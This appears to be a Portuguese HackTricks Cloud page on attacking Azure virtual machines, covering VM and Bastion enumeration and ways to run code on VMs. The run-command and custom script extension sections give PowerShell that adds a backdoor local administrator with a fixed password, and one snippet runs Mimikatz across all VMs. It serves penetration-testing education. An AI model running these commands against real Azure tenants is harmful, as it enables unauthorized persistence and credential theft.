# Az - M√°quinas Virtuais e Rede

<details>

<summary><strong>Aprenda hacking na AWS do zero ao her√≥i com</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Outras formas de apoiar o HackTricks:

* Se voc√™ deseja ver sua **empresa anunciada no HackTricks** ou **baixar o HackTricks em PDF** Confira os [**PLANOS DE ASSINATURA**](https://github.com/sponsors/carlospolop)!
* Adquira o [**swag oficial do PEASS & HackTricks**](https://peass.creator-spring.com)
* Descubra [**A Fam√≠lia PEASS**](https://opensea.io/collection/the-peass-family), nossa cole√ß√£o exclusiva de [**NFTs**](https://opensea.io/collection/the-peass-family)
* **Junte-se ao** üí¨ [**grupo Discord**](https://discord.gg/hRep4RUj7f) ou ao [**grupo telegram**](https://t.me/peass) ou **siga-nos** no **Twitter** üê¶ [**@hacktricks_live**](https://twitter.com/hacktricks_live)**.**
* **Compartilhe seus truques de hacking enviando PRs para os reposit√≥rios** [**HackTricks**](https://github.com/carlospolop/hacktricks) e [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>

## Informa√ß√µes B√°sicas

[A partir da documenta√ß√£o:](https://learn.microsoft.com/en-us/azure/virtual-machines/overview) As m√°quinas virtuais do Azure s√£o um dos v√°rios tipos de [recursos computacionais escal√°veis sob demanda](https://learn.microsoft.com/en-us/azure/architecture/guide/technology-choices/compute-decision-tree) que o Azure oferece. Normalmente, voc√™ escolhe uma m√°quina virtual quando precisa de mais controle sobre o ambiente de computa√ß√£o do que as outras op√ß√µes oferecem. Este artigo fornece informa√ß√µes sobre o que voc√™ deve considerar antes de criar uma m√°quina virtual, como cri√°-la e como gerenci√°-la.

## Informa√ß√µes da Rede Azure

As redes Azure cont√™m **entidades diferentes e formas de configur√°-las.** Voc√™ pode encontrar **descri√ß√µes breves,** **exemplos** e **comandos de enumera√ß√£o** das diferentes entidades de rede Azure em:

{% content-ref url="az-azure-network.md" %}
[az-azure-network.md](az-azure-network.md)
{% endcontent-ref %}

## Azure Bastion

**Azure Bastion** oferece uma solu√ß√£o de acesso seguro e totalmente gerenciada para RDP (Remote Desktop Protocol) e SSH (Secure Shell) por SSL por meio do portal Azure. Ele est√° integrado a uma Rede Virtual do Azure, permitindo conectividade RDP e SSH √†s VMs usando IPs privados, evitando a necessidade de IPs p√∫blicos. Isso o torna uma alternativa mais segura e conveniente aos m√©todos tradicionais que envolvem atribui√ß√µes de IPs p√∫blicos e configura√ß√µes de regras NSG para acesso √†s VMs. Desenvolvedores e pessoal de TI podem acessar com seguran√ßa as VMs a partir do portal Azure usando seus navegadores da web, simplificando o processo para ambientes de desenvolvimento e testes.

Para listar todos os Hosts do Azure Bastion em sua assinatura, voc√™ pode usar o seguinte comando:

{% code overflow="wrap" %}
```bash
az network bastion list --query "[].{name:name, resourceGroup:resourceGrou, location:location}" -o table
```
{% endcode %}

## Enumera√ß√£o de VM
```powershell
# Get readable VMs
Get-AzVM | fl
# Lis running VMs
Get-AzureRmVM -status | where {$_.PowerState -EQ "VM running"} | select ResourceGroupName,Name
Get-AzVM -Name <name> -ResourceGroupName <res_group_name> | fl *
Get-AzVM -Name <name> -ResourceGroupName <res_group_name> | select -ExpandProperty NetworkProfile

# Get iface and IP address
Get-AzNetworkInterface -Name <interface_name>
Get-AzPublicIpAddress -Name <iface_public_ip_id>

#Get installed extensions
Get-AzVMExtension -ResourceGroupName <res_group_name> -VMName <name>

Get-AzVM | select -ExpandProperty NetworkProfile # Get name of network connector of VM
Get-AzNetworkInterface -Name <name> # Get info of network connector (like IP)
```
## **Executar comandos em uma VM**

### **Login do AAD na VM**

√â poss√≠vel permitir o acesso a usu√°rios autenticados via AzureAD. Por exemplo, ao tentar acessar uma **VM Linux**: `ssh username@azure-corp.com@1.1.1.1` (√© importante **usar o e-mail** com o azurecorp usado ao tentar fazer login), voc√™ pode receber um erro como:

{% code overflow="wrap" %}
```
(username@azure-corp.com@1.1.1.1) This preview capability is not for production use. When you sign in, verify the name of the app on the sign-in screen is "Azure Linux VM Sign-in" and the IP address of the target VM is correct.

To sign in, use a web browser to open the page https://microsoft.com/devicelogin and enter the code DT4PNSTGR to authenticate. Press ENTER when ready.
```
{% endcode %}

Apenas **siga essas instru√ß√µes** acessando [https://microsoft.com/devicelogin](https://microsoft.com/devicelogin) e indicando o c√≥digo, use o e-mail e a senha como credenciais e voc√™ poder√° se conectar via SSH (se esse usu√°rio tiver permiss√µes suficientes para fazer isso: fun√ß√£o `Virtual Machine Administrator Login` ou `Virtual Machine User Login`).

### **Executar Comando**
```powershell
# The permission allowing this is Microsoft.Compute/virtualMachines/runCommand/action
Invoke-AzVMRunCommand -ScriptPath .\adduser.ps1 -CommandId 'RunPowerShellScript' -VMName 'juastavm' -ResourceGroupName 'Research' ‚ÄìVerbose
## Another way
Invoke-AzureRmVMRunCommand -ScriptPath .\adduser.ps1 -CommandId 'RunPowerShellScript' -VMName 'juastavm' -ResourceGroupName 'Research' ‚ÄìVerbose

# Content of the script
$passwd = ConvertTo-SecureString "Welcome2022!" -AsPlainText -Force
New-LocalUser -Name new_user -Password $passwd
Add-LocalGroupMember -Group Administrators -Member new_user
```

```powershell
# Try to run in every machine
Import-module MicroBurst.psm1
Invoke-AzureRmVMBulkCMD -Script Mimikatz.ps1 -Verbose -output Output.txt
```
### **Executar Extens√£o de Script Personalizado**

As extens√µes de m√°quinas virtuais (VMs) do Azure s√£o **pequenas aplica√ß√µes** que fornecem configura√ß√£o p√≥s-implementa√ß√£o e tarefas de automa√ß√£o em **VMs do Azure**. Por exemplo, se uma m√°quina virtual requer instala√ß√£o de software, prote√ß√£o antiv√≠rus ou a capacidade de executar um script dentro dela, voc√™ pode usar uma extens√£o de VM.

Portanto, se voc√™ tiver acesso para escrever, voc√™ pode executar c√≥digo arbitr√°rio:
```powershell
# Microsoft.Compute/virtualMachines/extensions/write
Set-AzVMExtension -ResourceGroupName "Research" -ExtensionName "ExecCmd" -VMName "infradminsrv" -Location "Germany West Central" -Publisher Microsoft.Compute -ExtensionType CustomScriptExtension -TypeHandlerVersion 1.8 -SettingString '{"commandToExecute":"powershell net users new_user Welcome2022. /add /Y; net localgroup administrators new_user /add"}'
```
### Estado de Configura√ß√£o Desejado (DSC)

O Estado de Configura√ß√£o Desejado (DSC) √© uma ferramenta do PowerShell semelhante ao Ansible, usada para configurar um host por meio de c√≥digo. O DSC integra-se ao Azure, permitindo o upload de arquivos de configura√ß√£o espec√≠ficos. Esses arquivos devem seguir uma sintaxe rigorosa. Notavelmente, a extens√£o DSC no Azure pode executar comandos de arquivos que atendem a certos crit√©rios de formata√ß√£o, mesmo que a sintaxe n√£o esteja correta para os padr√µes do DSC, conforme mostrado na figura fornecida.

A execu√ß√£o desses comandos √© facilitada pela fun√ß√£o [**`Publish-AzVMDscConfiguration`**](https://docs.microsoft.com/en-us/powershell/module/az.compute/publish-azvmdscconfiguration?view=azps-7.5.0) no Az PowerShell. Os requisitos incluem um arquivo **.PS1** com uma fun√ß√£o definida e o arquivo deve ser compactado em um arquivo **.zip**. Mesmo que a sintaxe possa n√£o estar correta para o DSC, o c√≥digo ainda ser√° executado. No entanto, a extens√£o marcar√° o status de execu√ß√£o como "falha" e nenhuma sa√≠da do comando ser√° vis√≠vel devido ao status ser sobrescrito pela mensagem de falha.

### Defini√ß√µes de Aplicativos de VM

As Defini√ß√µes de Aplicativos de VM permitem a implanta√ß√£o repet√≠vel de aplicativos versionados em uma VM do Azure. Este recurso suporta a implanta√ß√£o e atualiza√ß√£o de aplicativos em v√°rias VMs. Para configurar isso, v√°rias etapas s√£o necess√°rias, envolvendo comandos como **`New-AzGalleryApplication`** e **`New-AzGalleryApplicationVersion`** no Az PowerShell.

A execu√ß√£o de aplicativos ou comandos por meio deste m√©todo envolve o **"VMAppExtension"**, que √© instalado automaticamente quando um aplicativo √© aplicado a uma VM. A extens√£o recupera o arquivo da URI especificada e o nomeia exatamente como o aplicativo, sem uma extens√£o. Para executar o arquivo corretamente, o campo "ManageActions" na chamada da API REST deve ser configurado para renomear o arquivo com a extens√£o apropriada. A configura√ß√£o deste m√©todo, uma vez conclu√≠da, se assemelhar√° √† estrutura mostrada na figura fornecida.

No entanto, esse m√©todo de execu√ß√£o √© relativamente lento, levando cerca de 3-4 minutos para executar um aplicativo ou comando. Os arquivos relacionados a esse processo s√£o armazenados em diret√≥rios espec√≠ficos (`C:\Packages\Plugins\Microsoft.CPlat.Core.VMApplicationManagerWindows\1.0.4\Downloads\` para a c√≥pia do aplicativo e `C:\Packages\Plugins\Microsoft.CPlat.Core.VMApplicationManagerWindows\1.0.4\Status\` para o status de execu√ß√£o).

Ambas as t√©cnicas fornecem maneiras √∫nicas de executar comandos e implantar aplicativos em ambientes Azure, cada uma com seu pr√≥prio conjunto de requisitos, etapas e considera√ß√µes.

### Grupos de Trabalhadores H√≠bridos (HWGs) no Azure

[**Grupos de Trabalhadores H√≠bridos (HWGs)**](https://docs.microsoft.com/en-us/azure/automation/automation-hybrid-runbook-worker) s√£o um recurso no Azure que permite que Runbooks, configurados em uma Conta de Automa√ß√£o, sejam executados em uma M√°quina Virtual (VM) do Azure que faz parte do HWG designado. Essa execu√ß√£o √© facilitada por meio de uma extens√£o instalada na VM, que implanta o c√≥digo do Runbook na VM. Um aspecto significativo desse processo √© que as credenciais reais n√£o s√£o um fator na execu√ß√£o porque o c√≥digo √© executado com privil√©gios elevados, especificamente como **SYSTEM** ou root, conforme ilustrado na figura fornecida.

Um detalhe crucial para aqueles que utilizam VMs do Windows 10 √© a necessidade de especificar a vers√£o do PowerShell para o Runbook. Deve ser configurado para ser executado como a Vers√£o 5.1 do PowerShell em vez da 7.1. Esse requisito decorre do fato de que o PowerShell 7.1 n√£o √© instalado por padr√£o nessas VMs, levando a uma falha na execu√ß√£o do script se a vers√£o 7.1 for especificada.

Este recurso do Azure oferece um m√©todo robusto para automatizar e gerenciar tarefas em ambientes h√≠bridos, permitindo o gerenciamento centralizado e a execu√ß√£o de tarefas em VMs do Azure.


## Refer√™ncias

* [https://learn.microsoft.com/en-us/azure/virtual-machines/overview](https://learn.microsoft.com/en-us/azure/virtual-machines/overview)
* [https://hausec.com/2022/05/04/azure-virtual-machine-execution-techniques/](https://hausec.com/2022/05/04/azure-virtual-machine-execution-techniques/)

<details>

<summary><strong>Aprenda hacking AWS do zero ao her√≥i com</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Outras maneiras de apoiar o HackTricks:

* Se voc√™ deseja ver sua **empresa anunciada no HackTricks** ou **baixar o HackTricks em PDF** Confira os [**PLANOS DE ASSINATURA**](https://github.com/sponsors/carlospolop)!
* Adquira o [**swag oficial PEASS & HackTricks**](https://peass.creator-spring.com)
* Descubra [**A Fam√≠lia PEASS**](https://opensea.io/collection/the-peass-family), nossa cole√ß√£o exclusiva de [**NFTs**](https://opensea.io/collection/the-peass-family)
* **Junte-se ao** üí¨ [**grupo Discord**](https://discord.gg/hRep4RUj7f) ou ao [**grupo telegram**](https://t.me/peass) ou **siga-nos** no **Twitter** üê¶ [**@hacktricks_live**](https://twitter.com/hacktricks_live)**.**
* **Compartilhe seus truques de hacking enviando PRs para o** [**HackTricks**](https://github.com/carlospolop/hacktricks) e [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
